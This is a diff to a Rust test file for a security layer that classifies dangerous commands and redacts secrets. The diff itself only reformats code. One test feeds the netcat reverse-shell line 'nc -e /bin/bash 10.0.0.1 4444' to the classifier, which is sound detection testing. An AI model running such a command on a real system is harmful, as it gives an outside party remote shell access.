@@ -6,11 +6,10 @@
 //! redaction, ledger entry accumulation, and artifact export.
 
 use pi::extensions::{
-    DangerousCommandClass, ExecMediationArtifact, ExecMediationLedgerEntry,
-    ExecMediationPolicy, ExecMediationResult, ExecRiskTier, ExtensionManager,
-    ExtensionPolicy, PolicyProfile, SecretBrokerArtifact, SecretBrokerLedgerEntry,
-    SecretBrokerPolicy, classify_dangerous_command, evaluate_exec_mediation,
-    redact_command_for_logging, sha256_hex_standalone,
+    DangerousCommandClass, ExecMediationArtifact, ExecMediationLedgerEntry, ExecMediationPolicy,
+    ExecMediationResult, ExecRiskTier, ExtensionManager, ExtensionPolicy, PolicyProfile,
+    SecretBrokerArtifact, SecretBrokerLedgerEntry, SecretBrokerPolicy, classify_dangerous_command,
+    evaluate_exec_mediation, redact_command_for_logging, sha256_hex_standalone,
 };
 
 // ==========================================================================
@@ -66,8 +65,7 @@ fn classify_chmod_777() {
 
 #[test]
 fn classify_reverse_shell_nc() {
-    let classes =
-        classify_dangerous_command("nc -e /bin/bash 10.0.0.1 4444", &[]);
+    let classes = classify_dangerous_command("nc -e /bin/bash 10.0.0.1 4444", &[]);
     assert!(classes.contains(&DangerousCommandClass::ReverseShell));
 }
 
@@ -446,10 +444,7 @@ fn secret_broker_policy_roundtrip() {
     assert_eq!(restored.enabled, broker.enabled);
     assert_eq!(restored.secret_suffixes.len(), broker.secret_suffixes.len());
     assert_eq!(restored.secret_exact.len(), broker.secret_exact.len());
-    assert_eq!(
-        restored.redaction_placeholder,
-        broker.redaction_placeholder
-    );
+    assert_eq!(restored.redaction_placeholder, broker.redaction_placeholder);
 }
 
 #[test]
@@ -537,8 +532,7 @@ fn exec_mediation_ledger_entry_roundtrip() {
         reason: "blocked by policy".to_string(),
     };
     let json = serde_json::to_string(&entry).expect("serialize");
-    let restored: ExecMediationLedgerEntry =
-        serde_json::from_str(&json).expect("deserialize");
+    let restored: ExecMediationLedgerEntry = serde_json::from_str(&json).expect("deserialize");
     assert_eq!(restored.ts_ms, entry.ts_ms);
     assert_eq!(restored.extension_id, entry.extension_id);
     assert_eq!(restored.command_hash, entry.command_hash);
@@ -556,8 +550,7 @@ fn secret_broker_ledger_entry_roundtrip() {
         reason: "suffix match: _KEY".to_string(),
     };
     let json = serde_json::to_string(&entry).expect("serialize");
-    let restored: SecretBrokerLedgerEntry =
-        serde_json::from_str(&json).expect("deserialize");
+    let restored: SecretBrokerLedgerEntry = serde_json::from_str(&json).expect("deserialize");
     assert_eq!(restored.ts_ms, entry.ts_ms);
     assert_eq!(restored.redacted, entry.redacted);
     assert_eq!(restored.name_hash, entry.name_hash);
@@ -645,8 +638,7 @@ fn exec_mediation_artifact_roundtrip() {
 
     let artifact = manager.exec_mediation_artifact();
     let json = serde_json::to_string_pretty(&artifact).expect("serialize");
-    let restored: ExecMediationArtifact =
-        serde_json::from_str(&json).expect("deserialize");
+    let restored: ExecMediationArtifact = serde_json::from_str(&json).expect("deserialize");
     assert_eq!(restored.schema, artifact.schema);
     assert_eq!(restored.entry_count, artifact.entry_count);
     assert_eq!(restored.entries.len(), artifact.entries.len());
@@ -666,8 +658,7 @@ fn secret_broker_artifact_roundtrip() {
 
     let artifact = manager.secret_broker_artifact();
     let json = serde_json::to_string_pretty(&artifact).expect("serialize");
-    let restored: SecretBrokerArtifact =
-        serde_json::from_str(&json).expect("deserialize");
+    let restored: SecretBrokerArtifact = serde_json::from_str(&json).expect("deserialize");
     assert_eq!(restored.schema, artifact.schema);
     assert_eq!(restored.entry_count, artifact.entry_count);
     assert!(restored.entries[0].redacted);
@@ -710,10 +701,7 @@ fn exec_mediation_command_hash_is_redacted() {
     let hash_redacted = sha256_hex_standalone(&redacted);
 
     // The hashes should differ because redaction changes the command
-    assert_ne!(
-        hash_raw, hash_redacted,
-        "Redaction should change the hash"
-    );
+    assert_ne!(hash_raw, hash_redacted, "Redaction should change the hash");
     // The redacted hash is what should appear in the ledger
     assert!(!redacted.contains("sk-ant-xxx"));
 }
@@ -774,8 +762,7 @@ fn command_class_serde_roundtrip() {
     ];
     for class in &classes {
         let json = serde_json::to_string(class).expect("serialize");
-        let restored: DangerousCommandClass =
-            serde_json::from_str(&json).expect("deserialize");
+        let restored: DangerousCommandClass = serde_json::from_str(&json).expect("deserialize");
         assert_eq!(*class, restored);
     }
 }
